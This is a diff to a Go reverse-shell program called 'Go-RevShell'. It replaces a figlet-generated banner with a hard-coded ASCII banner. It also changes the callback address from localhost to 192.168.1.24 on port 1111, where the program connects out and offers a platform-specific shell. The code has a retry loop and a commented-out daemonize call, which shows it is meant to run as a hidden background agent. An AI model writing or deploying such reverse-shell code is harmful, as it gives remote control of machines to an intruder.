@@ -10,13 +10,21 @@ import (
 	"strings"
 	"time"
 
-	"github.com/common-nighthawk/go-figure"
 	"github.com/takama/daemon"
 )
 
+const banner string = `
+  ____                   ____                   ____    _              _   _
+ / ___|   ___           |  _ \    ___  __   __ / ___|  | |__     ___  | | | |
+| |  _   / _ \   _____  | |_) |  / _ \ \ \ / / \___ \  | '_ \   / _ \ | | | |
+| |_| | | (_) | |_____| |  _ <  |  __/  \ V /   ___) | | | | | |  __/ | | | |
+ \____|  \___/          |_| \_\  \___|   \_/   |____/  |_| |_|  \___| |_| |_|
+
+`
+
 func main() {
 	// daemonize()
-	connectToClient("localhost", 1111)
+	connectToClient("192.168.1.24", 1111)
 }
 
 func daemonize() {
@@ -32,7 +40,7 @@ func connectToClient(host string, port int) {
 		if err != nil {
 			time.Sleep(2 * time.Second)
 		} else {
-			connexion.Write([]byte(figure.NewFigure("Go-RevShell", "", true).String() + "\n[+] Connected to server.\nType \"quit\" to close the shell properly or the process will die server side.\n"))
+			connexion.Write([]byte(banner + "[+] Connected to server.\nType \"quit\" to close the shell properly or the process will die server side.\n"))
 			var shell string
 			switch runtime.GOOS {
 			case "windows":
